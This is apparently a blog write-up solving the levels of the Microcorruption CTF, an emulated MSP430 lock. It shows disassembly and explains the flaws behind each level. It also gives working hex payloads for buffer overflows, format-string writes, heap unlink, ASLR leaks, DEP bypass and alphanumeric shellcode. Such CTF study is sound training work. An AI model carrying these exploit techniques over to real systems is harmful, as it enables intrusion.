---
title: "Microcorruption Writeup"
date: 2018-06-12T22:32:57+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up"
]
description: solves for Microcorruption challenges
---

# New Orleans - 10pts

Here is the code for checking the password:

```
44bc:  0e43           clr	r14
44be:  0d4f           mov	r15, r13
44c0:  0d5e           add	r14, r13
44c2:  ee9d 0024      cmp.b	@r13, 0x2400(r14)
44c6:  0520           jne	#0x44d2 <check_password+0x16>
44c8:  1e53           inc	r14
44ca:  3e92           cmp	#0x8, r14
44cc:  f823           jne	#0x44be <check_password+0x2>
44ce:  1f43           mov	#0x1, r15
44d0:  3041           ret
44d2:  0f43           clr	r15
44d4:  3041           ret
```

It basically takes each byte and perform `cmp.b	@r13, 0x2400(r14)` on it.

After a bit of internet research I found this:

> 0x2400(r14) is an offset syntax. Take the value in register 14, add 0x2400 to it, and look up what's in memory at that address. [src](https://news.ycombinator.com/item?id=7073651)

Therefore, it just compares the first 8 bytes at `0x2400` and the input.

Using the read command we can see whats at `0x2400`:

```
> r 2400 8
   2400:   3076 4e5b 5134 3f00  0vN[Q4?.
```

> This problem is about reading data from memory.

password: `3076 4e5b 5134 3f00` in hex

# Sydney - 15pts

here is the new check password function:

```
448a <check_password>
448a:  bf90 2a3f 0000 cmp	#0x3f2a, 0x0(r15)
4490:  0d20           jnz	$+0x1c
4492:  bf90 7674 0200 cmp	#0x7476, 0x2(r15)
4498:  0920           jnz	$+0x14
449a:  bf90 3638 0400 cmp	#0x3836, 0x4(r15)
44a0:  0520           jne	#0x44ac <check_password+0x22>
44a2:  1e43           mov	#0x1, r14
44a4:  bf90 3b7c 0600 cmp	#0x7c3b, 0x6(r15)
44aa:  0124           jeq	#0x44ae <check_password+0x24>
44ac:  0e43           clr	r14
44ae:  0f4e           mov	r14, r15
44b0:  3041           ret
```

In this code, there is four compare statements and each of them tells two bytes of the password:

```
cmp	#0x3f2a, 0x0(r15) > 0x3f2a for byte 0 and 1
cmp	#0x7476, 0x2(r15) > 0x7476 for byte 2 and 3
cmp	#0x3836, 0x4(r15) > 0x3836 for byte 4 and 5
cmp	#0x7c3b, 0x6(r15) > 0x7c3b for byte 6 and 7
```

I was stuck on this challenge for a while and was able to solve it after looking at [this](https://www.reddit.com/r/microcorruption/comments/4lif50/how_does_one_get_good_at_this/).

Essentially, you need to flip the two bytes (for example `2a3f` instead of `3f2a`) because of the endianness of the system. It is for the same reason why `p32` and `p64` exist in pwntools.

password: `2a3f 7674 3638 3b7c` in hex

# Hanoi - 20pts

the challenges states:
> Remember: passwords are between 8 and 16 characters.

However, the `getsn` call reads in 28 bytes to `0x2400` which means we can override some other stuff.

Looking at the login function:

```
4520 <login>
...
4552:  3f40 d344      mov	#0x44d3 "Testing if password is valid.", r15
4556:  b012 de45      call	#0x45de <puts>
455a:  f290 a700 1024 cmp.b	#0xa7, &0x2410
4560:  0720           jne	#0x4570 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
4566:  b012 de45      call	#0x45de <puts>
456a:  b012 4844      call	#0x4448 <unlock_door>
456e:  3041           ret
4570:  3f40 0145      mov	#0x4501 "That password is not correct.", r15
4574:  b012 de45      call	#0x45de <puts>
4578:  3041           ret
```

We can see on this line `cmp.b	#0xa7, &0x2410` that `&0x24100` have to equal `0xa7` which is should be set by the HSM, but, in this case, we can just override it ourselves.

The payload would first have 16 bytes of random data and then `0xa7` for the 17th byte.

> This is a simple buffer overflow.

password: `0000 0000 0000 0000 0000 0000 0000 0000 a7` in hex

# Cusco - 25pts

This is a classic buffer overflow exploit. By entering more than 16 bytes we are able to alter the instruction pointer (`pc` in this case) to redirect the program. I picked `0x2845` which mean the program will return to `0x4528` after the login function returns.

password: `0000 0000 0000 0000 0000 0000 0000 0000 2845` in hex

# Reykjavik - 35pts

By setting a break point after the encryption function and using the [dissembler](https://microcorruption.com/assembler), we are able to obtain the source code of the challenge:

```
0b12           push	r11
0412           push	r4
0441           mov	sp, r4
2452           add	#0x4, r4
3150 e0ff      add	#0xffe0, sp
3b40 2045      mov	#0x4520, r11
073c           jmp	$+0x10
1b53           inc	r11
8f11           sxt	r15
0f12           push	r15
0312           push	#0x0
b012 6424      call	#0x2464
2152           add	#0x4, sp
6f4b           mov.b	@r11, r15
4f93           tst.b	r15
f623           jnz	$-0x12      # puts characters one by one @0x4520
3012 0a00      push	#0xa
0312           push	#0x0
b012 6424      call	#0x2464
2152           add	#0x4, sp
3012 1f00      push	#0x1f
3f40 dcff      mov	#0xffdc, r15
0f54           add	r4, r15
0f12           push	r15
2312           push	#0x2
b012 6424      call	#0x2464     # ask for input
3150 0600      add	#0x6, sp
b490 5cca dcff cmp	#0xca5c, -0x24(r4)    # have to be zero to open the lock
0520           jnz	$+0xc
3012 7f00      push	#0x7f
b012 6424      call	#0x2464               # opens the lock
2153           incd	sp
3150 2000      add	#0x20, sp
3441           pop	r4
3b41           pop	r11
3041           ret
```

Therefore, `cmp	#0xca5c, -0x24(r4)` have to be true which mean the first two bytes have to be `0x5c` and `0xca` respectively.

password: `5cca`

# Whitehorse - 50pts

Classic buffer overflow plus shellcode

Because NX and ASLR is no enabled, we can first gain control of the `pc` pointer by overflowing the stack and then return to our input which also contains the shellcode.

password: `3012 7f00 b012 3245 0000 0000 0000 0000 403e`

# Montevideo - 50pts

This challenge is similar to the last one, but there is an additional `strcpy` which no `0x00` in our payloadl; therefore, we have to use a bit of ROP to solve this one:

```
Payload:
  16 bytes padding - '0x65'*16
  the INT function @0x454c - '0x4c45'
  junk return address - '0x6565'
  params - '0x7f'
```

password: `6565 6565 6565 6565 6565 6565 6565 6565 4c45 6565 7f`

# Johannesburg - 20pts

This challenge attempts to control the input size using a hard coded stack canary which could be easily bypassed.

`4578:  f190 3800 1100 cmp.b	#0x38, 0x11(sp)` shows that the 17th byte need to be `0x38` for the input to pass the check.

password: `6565 6565 6565 6565 6565 6565 6565 6565 aa38 4644`

# Santa Cruz - 50pts


There is three parts to this challenge:

```
455c:  c443 faff      mov.b	#0x0, -0x6(r4)
4560:  f442 e7ff      mov.b	#0x8, -0x19(r4)
4564:  f440 1000 e8ff mov.b	#0x10, -0x18(r4)
...
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
45e8:  8f11           sxt	r15
45ea:  0b9f           cmp	r15, r11
45ec:  0628           jnc	#0x45fa <login+0xaa>      <-- first check
45ee:  1f42 0024      mov	&0x2400, r15
45f2:  b012 2847      call	#0x4728 <puts>
45f6:  3040 4044      br	#0x4440 <__stop_progExec__>
45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
45fe:  8f11           sxt	r15
4600:  0b9f           cmp	r15, r11
4602:  062c           jc	#0x4610 <login+0xc0>      <-- second check
4604:  1f42 0224      mov	&0x2402, r15
4608:  b012 2847      call	#0x4728 <puts>
460c:  3040 4044      br	#0x4440 <__stop_progExec__>
...
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	#0x465e <login+0x10e>    <-- third check
4652:  1f42 0024      mov	&0x2400, r15
4656:  b012 2847      call	#0x4728 <puts>
465a:  3040 4044      br	#0x4440 <__stop_progExec__>
```

1. `-0x6(r4)` have to be zero
2. `-0x18(r4)` have to be larger than the length of our input
3. `-0x19(r4)` have to be smaller than the length of our input

We can override the return address, `-0x18(r4)`, and `-0x19(r4)` with our username input, and use the null byte from `strcpy` to fill `-0x6(r4)` using the password input.

username: `6161 6161 6161 6161 6161 6161 6161 6161 6101 ff61 6161 6161 6161 6161 6161 6161 6161 6161 6161 6161 6161 4a44`

password: `4242 4242 4242 4242 4242 4242 4242 4242 42`

# Jakarta - 40pts

```
45aa:  b012 f446      call	#0x46f4 <strcpy>
45ae:  7b90 2100      cmp.b	#0x21, r11
45b2:  0628           jnc	#0x45c0 <login+0x60>
45b4:  1f42 0024      mov	&0x2400, r15
45b8:  b012 c846      call	#0x46c8 <puts>
45bc:  3040 4244      br	#0x4442 <__stop_progExec__>
...
4600:  7f90 2100      cmp.b	#0x21, r15
4604:  0628           jnc	#0x4612 <login+0xb2>
4606:  1f42 0024      mov	&0x2400, r15
460a:  b012 c846      call	#0x46c8 <puts>
460e:  3040 4244      br	#0x4442 <__stop_progExec__>
```

The length check uses `cmp.b` which means only the last byte is compared; therefore, if the length is `0x100`, it will still pass the test.

username: `4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141`

password: `4141 4141 4c44 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141`

# Addis Ababa - 50pts

```
4438 <main>
4438:  3150 eaff      add	#0xffea, sp
443c:  8143 0000      clr	0x0(sp)
4440:  3012 e644      push	#0x44e6 "Login with username:password below to authenticate.\n"
4444:  b012 c845      call	#0x45c8 <printf>
4448:  b140 1b45 0000 mov	#0x451b ">> ", 0x0(sp)
444e:  b012 c845      call	#0x45c8 <printf>    <-- output
4452:  2153           incd	sp
4454:  3e40 1300      mov	#0x13, r14            <-- input length 0x13=19 bytes
4458:  3f40 0024      mov	#0x2400, r15
445c:  b012 8c45      call	#0x458c <getsn>     <-- get input (address: 0x2400)
4460:  0b41           mov	sp, r11
4462:  2b53           incd	r11
4464:  3e40 0024      mov	#0x2400, r14
4468:  0f4b           mov	r11, r15
446a:  b012 de46      call	#0x46de <strcpy>    <-- copy onto the stack (one null byte only)
446e:  3f40 0024      mov	#0x2400, r15
4472:  b012 b044      call	#0x44b0 <test_password_valid>   <-- test password
4476:  814f 0000      mov	r15, 0x0(sp)
447a:  0b12           push	r11
447c:  b012 c845      call	#0x45c8 <printf>    <-- prints password after check, also printf not putchar (format string vulnerability)
4480:  2153           incd	sp
4482:  3f40 0a00      mov	#0xa, r15
4486:  b012 5045      call	#0x4550 <putchar>
448a:  8193 0000      tst	0x0(sp)   <-- cannot be zero (HSM return)
448e:  0324           jz	#0x4496 <main+0x5e>
4490:  b012 da44      call	#0x44da <unlock_door>
4494:  053c           jmp	#0x44a0 <main+0x68>
4496:  3012 1f45      push	#0x451f "That entry is not valid."
449a:  b012 c845      call	#0x45c8 <printf>
449e:  2153           incd	sp
44a0:  0f43           clr	r15
44a2:  3150 1600      add	#0x16, sp
```

This a classic format string challenge.

This will be the structure of our payload:

- address to override
- padding
- `%n` to write

This attack works because when `printf` sees `%n` it will write the number of character printed to the location of the next pointer (which is also on the stack and controllable).

password: `103C 2578 256E`

# Novosibirsk - 40pts

```
4438:  0441           mov	sp, r4
443a:  2453           incd	r4
443c:  3150 0cfe      add	#0xfe0c, sp
4440:  3012 da44      push	#0x44da "Enter your username below to authenticate.\n"
4444:  b012 c645      call	#0x45c6 <printf>
4448:  b140 0645 0000 mov	#0x4506 ">> ", 0x0(sp)
444e:  b012 c645      call	#0x45c6 <printf>    <-- output
4452:  2153           incd	sp
4454:  3e40 f401      mov	#0x1f4, r14           <-- 0x1f4=500 bytes - overflow
4458:  3f40 0024      mov	#0x2400, r15          <-- to 0x2400
445c:  b012 8a45      call	#0x458a <getsn>     <-- get input
4460:  3e40 0024      mov	#0x2400, r14
4464:  0f44           mov	r4, r15
4466:  3f50 0afe      add	#0xfe0a, r15
446a:  b012 dc46      call	#0x46dc <strcpy>    <-- one null byte only
446e:  3f40 0afe      mov	#0xfe0a, r15
4472:  0f54           add	r4, r15
4474:  0f12           push	r15
4476:  b012 c645      call	#0x45c6 <printf>    <-- print input - format str
447a:  2153           incd	sp
447c:  3f40 0a00      mov	#0xa, r15
4480:  b012 4e45      call	#0x454e <putchar>   <-- change the call address 0x454e --> 0x4536
4484:  0f44           mov	r4, r15
4486:  3f50 0afe      add	#0xfe0a, r15
448a:  b012 b044      call	#0x44b0 <conditional_unlock_door>
448e:  0f93           tst	r15
4490:  0324           jz	#0x4498 <main+0x60>
4492:  3012 0a45      push	#0x450a "Access Granted!"
4496:  023c           jmp	#0x449c <main+0x64>
4498:  3012 1a45      push	#0x451a "That username is not valid."
449c:  b012 c645      call	#0x45c6 <printf>
44a0:  0f43           clr	r15
44a2:  3150 f601      add	#0x1f6, sp
```

This is also a format string challenge. Because there is no memory protection, we can just override the assembly instructions. In this case, I changed `44c6:  3012 7e00      push	#0x7e` to `44c6:  3012 7e00      push	#0x7f` which did the job.

password 1: `c844 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4125 6E`

# Algiers - 100pts

```
void free(void *ptr) {

r15 -= 0x6;                 // get real start
r13 = *(r15+0x4) & 0xfffe;  // get real size
r15[+0x4] = r13;            // set last bit to zero
r14 = *r15;                 // prev block pointer
r12 = *(r14+0x4);           // size of the prev block

if (r12 & 0x1 == 0) {       // if the prev block is empty
  r12 += 0x6;               // add the meta data size
  r12 += r13;               // add the current block size
  r14[+0x4] = r12;          // set new size
  r14[+0x2] = *(r15+0x2);   // set the next block of the prev block to the next block of the current block
  r13 = *(r15+0x2);         // r13 to be the next block
  r13[] = r14               // mov the prev block to be the prev block of the next block
  r15[] = *r15;             // write the prev block of the current block to be the current block
}

r14 = *(r15+0x2);           // get the next block
r13 = *(r14+0x4);           // get the size of the next block

if (r13 & 0x1 == 0) {       // if the next block is empty
  454a:  1d5f 0400      add	0x4(r15), r13
  454e:  3d50 0600      add	#0x6, r13
  4552:  8f4d 0400      mov	r13, 0x4(r15)
  4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)
  455c:  8e4f 0000      mov	r15, 0x0(r14)
}
}
```

This is the first challenge about exploiting the heap. The heap implementation here has 6 bytes of metadata along with the accrual data. The metadata consist of `1. the previous block 2. the next block 3. the current block size plus the last bit indicates if it is in use`.

First, we are able to overflow both blocks on the heap (username and the PIN). That means the first block data could be used to override the metadata of the second block and second block data could be user to override the metadate of the third/final block.

Looking at the `free` function, we can see that it tries to merge free blocks that at next to each other. By setting the previous block of the second block to be the `return address - 0x4`, we will be able to add `current block size` (controllable) and `0x6` to it.

By doing some simple math:

```
>>> 0x4440 # current return address
17472
>>> 0x4564 # address of the unlock door function
17764
>>> 0x4564 - 0x4440 # offset
292
>>> 292 - 0x6 # get the second block size
286
>>> hex(286+0x1)
'0x11f'
```

We are able to determine that the second block needs a size of `0x11f` and the previous block have to point to `0x4396`.

To be able to ignore the next block, we will override the last bit of the ending block from `0`to `1` making it in use.

username: `4141 4141 4141 4141 4141 4141 4141 4141 9643 3424 1f01`

password: `4141 4141 4141 4141 4141 4141 4141 4141 1e24 0824 01`

# Vladivostok - 100pts

Finally... Sweet sweet ASLR!

This is the first challenge with Address Space Layout Randomisation or ASLR for short enabled.

Just like any other challenges with ASLR, we have to first leak a current address to find the relative offset. Thankfully, the program prints the `username` back to us using `printf` which makes it vulnerable to format string attacks. By doing `%x%x%x`, we are able to leak ASLR address which could then be used to calculate the relative offset:

```
> r c5de
   c5de:   0b12 0a12 0912 0812  ........
   c5e6:   0712 0612 0412 0441  .......A
   c5ee:   3450 0e00 2183 1a44  4P..!..D
   c5f6:   0200 8441 f0ff 0f4a  ...A...J
> reset
> r 476a
   476a:   0b12 0a12 0912 0812  ........
   4772:   0712 0612 0412 0441  .......A
   477a:   3450 0e00 2183 1a44  4P..!..D
   4782:   0200 8441 f0ff 0f4a  ...A...J
```

> In this case, the offset is `0xc5de - 0x476a = 0x7e74`

With the offset, we can then overflow the password input to gain control of the instruction pointer and call the `_INT` function with `0x7f` as the parameter to unlock the door:

`_INT: leak + (0x48ec - 0x476a)`

username: `%x %x`

password: `4141 4141 4141 4141 {pack(leak)} 4141 7f`

# Bangalore - 100pts

```
set_up_protection() {
  r15 = 0;
  mark_page_executable(r15);
  r11 = 0x1;
  if (r11 != 0x44) {
    r15 = r11;
    mark_page_writable(r15);
    r11++;
  }

  if (r11 != 0x100) {
  r15 = r11;
  mark_page_executable(r15);
  r11++;
  }

  turn_on_dep();
}
```

This challenge introduces NX/DEP which marks the 256 memory pages either writable or executable. The first approach would be to construct a ROP chain using existing gadgets; however, it is a small binary and there is no way we can set `sr` to `0xff00` directly.

That means, we have to inject and execute our own shellcode. We can first write the shellcode to the stack while it is still writable, change the stack to a executable region using a short ROP chain and then call our shellcode.

Here is how the payload would look like:

- shellcode to unlock the door
- padding
- address of the `mark_page_executable` function
- parameters to function placed in reverse order
- the address of the shellcode

password: `3240 00ff b012 1000 4141 4141 4141 4141 ba44 3f00 0000 ee3f`

# Lagos - 150pts

This challenge allows you to write `0x200` bytes on to the stack which could even override the binary file itself; however, only alphanumeric characters are allowed.


```
login() {

puts("Enter the password to continue.");
puts("Remember: passwords are between 8 and 16 characters.");
puts("Due to some users abusing our login system, we have");
puts("restricted passwords to only alphanumeric characters.");

getsn(size: 0x200, addr: 0x2400);       // the size is LARGE

4590:  5f42 0024      mov.b	&0x2400, r15

r14 = 0;
r12 = 0x9;
r13 = 0x19;

jmp to A

while (true) {
r11 = sp;
r11 += r14;
(*char) r11 = r15;
r15 = *(r14+0x2400);
r14++;

# A
r11 = (char*) r15;
r11 -= 48;

if (r11 < 0x9) {
  continue;
}

r11 -= 17;

if (r11 < 0x19) {
  continue;
}

r11 -= 32;

if (r11 < 0x19) {
  continue;
}

break;

}

*sp = 0x0;
r13 = 0x200;
r14 = 0;
r15 = 0x2400;
memset();

r15 = sp;
conditional_unlock_door();

if (r15 == 1) {
  puts("Access granted.");
} else {
  puts("That password is not correct.");
}

}
```

Looking at the implementation of the login function, there is no easy way of bypassing the limitation. Also due to the small binary size, we cannot use ROP chains; therefore, we have to craft our own shellcode using only alphanumeric characters.

I was stuck on this challenge for a long time and read [this](https://rakshacks.wordpress.com/2016/08/24/microcorruption-lagos/) and [this](https://nullset.xyz/2015/12/15/microcorruption-ctf-lagos/) before I was able to solve this.

Using the [instruction set](http://mspgcc.sourceforge.net/manual/x223.html), here is the shellcode I came up with:

```assembly
ret
add #0x7a7a, r9
subc #0x346C,R9
mov.b    r6, sr
add      #0x5444, sr
add      #0x5566, sr
add      #0x5556, sr
mov @R9+,PC
```

> the shellcode overrides the `conditional_unlock_door` function. that is why it starts with `ret`

The payload structure looks something like this:

- padding
- address of the shellcode
- more padding
- shellcode

password: `41 4141 4141 4141 4141 4141 4141 4141 4141 4844 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 304139507a7a39706c3442463250445432506655325056553049`
